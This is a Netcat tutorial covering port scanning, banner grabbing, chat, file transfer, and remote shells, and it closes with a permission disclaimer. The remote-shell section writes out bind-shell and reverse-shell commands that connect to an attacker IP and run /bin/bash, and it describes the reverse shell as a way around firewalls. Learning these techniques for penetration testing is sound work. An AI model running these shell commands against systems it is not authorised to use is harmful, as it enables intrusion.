Netcat is a versatile command-line utility for reading from and writing to network connections using TCP or UDP. It is designed to be a reliable back-end tool that can be used directly or easily driven by other programs and scripts. Because of its flexibility, it is often referred to as the "Swiss army knife for TCP/IP."

---

## Synopsis

The basic syntax for Netcat is:

Bash

```
nc [options] host port
```

---

## Key Features

- **Client and Server Modes**: Can act as a client to connect to services or as a server to listen for inbound connections.
    
- **Protocol Support**: Works with both TCP and UDP protocols.
    
- **Port Scanning**: Can be used to check for open ports on a target system.
    
- **Data Transfer**: Capable of transferring files and streams of data between systems.
    
- **Shell Pipelining**: Can be used to pipe the output of commands over the network.
    

---

## Common Use Cases and Examples

Below are some practical examples of how to use Netcat.

### 1. Port Scanning

You can use Netcat to determine which ports are open on a target host. The `-v` flag provides verbose output, and the `-z` flag scans for listening daemons without sending any data.

**Scan a single port:**

Bash

```
nc -vz <target_ip> <port>
# Example: nc -vz 192.168.1.1 80
```

**Scan a range of ports:**

Bash

```
nc -vz <target_ip> <start_port-end_port>
# Example: nc -vz 192.168.1.1 20-30
```

### 2. Banner Grabbing

Banner grabbing is a technique used to identify the version of a service running on an open port.

Bash

```
echo "" | nc -v -w 1 <target_ip> <port>
# Example: echo "" | nc -v -w 1 192.168.1.1 22
```

### 3. Creating a Simple Chat Server

You can quickly set up a basic client-server chat system.

On the server machine (listening):

Set up a listener on a specific port.

Bash

```
nc -l -p <port>
# Example: nc -l -p 1234
```

On the client machine (connecting):

Connect to the server's IP and port.

Bash

```
nc <server_ip> <port>
# Example: nc 192.168.1.10 1234
```

Once connected, anything typed in one terminal will appear in the other.

### 4. File Transfer

Netcat can be used to send files from one machine to another.

On the receiving machine (server):

Set up a listener and redirect the incoming data to a file.

Bash

```
nc -l -p <port> > received_file.txt
# Example: nc -l -p 1234 > received_file.txt
```

On the sending machine (client):

Connect to the receiver and send the file.

Bash

```
nc <receiver_ip> <port> < original_file.txt
# Example: nc 192.168.1.10 1234 < original_file.txt
```

### 5. Creating a Remote Shell

Netcat can be used to create a remote shell, which provides command-line access to a target machine. This is a common technique in penetration testing.

#### Bind Shell

The server (target) binds a shell to a port, and the client (attacker) connects to it.

On the target machine (server):

The -e option executes a command upon connection (in this case, /bin/bash).

Bash

```
nc -l -p <port> -e /bin/bash
# Example: nc -l -p 4444 -e /bin/bash
```

On the attacker machine (client):

Connect to the target's listening port to get shell access.

Bash

```
nc <target_ip> <port>
# Example: nc 192.168.1.10 4444
```

#### Reverse Shell (Reverse TCP)

The client (target) connects back to the server (attacker). This is often used to bypass firewalls that block incoming connections.

On the attacker machine (server):

Set up a listener to catch the incoming connection.

Bash

```
nc -l -p <port>
# Example: nc -l -p 4444
```

On the target machine (client):

Connect back to the attacker and send a shell.

Bash

```
nc <attacker_ip> <port> -e /bin/bash
# Example: nc 192.168.1.20 4444 -e /bin/bash
```

---

## Disclaimer

Netcat is a powerful tool that can be used for both legitimate system administration and malicious purposes. Always ensure you have explicit permission before using it on any network or system that you do not own. Use this tool responsibly and ethically.